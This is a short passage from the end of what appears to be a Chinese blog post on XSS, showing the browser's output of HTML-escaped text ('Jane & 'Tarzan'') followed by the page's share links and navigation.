<p>上面代码的浏览器输出：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Jane &amp; &#x27;Tarzan&#x27;</span><br><span class="line">Jane &amp; &#x27;Tarzan&#x27;</span><br></pre></td></tr></table></figure></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/26/XSS/,Mini's blog,XSS,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/27/xxe/" title="XXE">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/10/21/DNS%E5%A4%96%E5%B8%A6/" title="DNS外带">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>